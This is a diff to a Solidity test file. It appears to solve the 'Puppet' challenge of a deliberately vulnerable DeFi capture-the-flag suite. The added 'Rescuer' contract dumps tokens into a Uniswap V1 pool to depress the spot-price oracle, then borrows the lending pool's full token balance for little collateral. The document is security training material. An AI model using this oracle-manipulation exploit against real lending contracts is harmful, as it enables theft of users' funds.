@@ -92,7 +92,16 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        Rescuer rescuer = new Rescuer{value: PLAYER_INITIAL_ETH_BALANCE}(
+            token,
+            lendingPool,
+            uniswapV1Exchange,
+            recovery
+        );
+        token.transfer(address(rescuer), PLAYER_INITIAL_TOKEN_BALANCE);
+
+        rescuer.rescue();
+
     }
 
     // Utility function to calculate Uniswap prices
@@ -115,4 +124,37 @@ contract PuppetChallenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+
+contract Rescuer {
+    DamnValuableToken public token;
+    PuppetPool public lendingPool;
+    IUniswapV1Exchange public uniswapV1Exchange;
+    address public recovery;
+    constructor(DamnValuableToken _token,
+                PuppetPool _lendingPool,
+                IUniswapV1Exchange _uniswapV1Exchange,
+                address _recovery
+    ) payable {
+        token = _token;
+        lendingPool = _lendingPool;
+        uniswapV1Exchange = _uniswapV1Exchange;
+        recovery = _recovery;
+    }
+
+    function rescue() external {
+        token.approve(address(uniswapV1Exchange), type(uint256).max);
+        uniswapV1Exchange.tokenToEthSwapInput(
+                                              1000 ether, // tokens_sold
+                                              1, // min_eth
+                                              block.timestamp + 10 // deadline
+        );
+
+        uint256 oraclePrice = address(uniswapV1Exchange).balance * (10 ** 18) / token.balanceOf(address(uniswapV1Exchange));
+        console.log("Oracle price: ", oraclePrice);
+        lendingPool.borrow{value: 24 ether}(100_000 ether, recovery);
+    }
+
+    receive()external payable {}
 }
